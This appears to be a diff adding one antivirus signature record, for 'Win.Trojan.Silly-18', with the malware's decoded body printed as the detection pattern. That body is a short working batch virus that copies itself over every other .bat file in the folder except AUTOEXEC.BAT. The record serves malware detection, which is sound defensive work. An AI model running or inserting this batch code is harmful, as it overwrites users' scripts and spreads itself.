@@ -1,0 +1,7 @@
+VIRUS NAME: Win.Trojan.Silly-18
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo off
+for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT copy %0 %%b>nul
+echo on
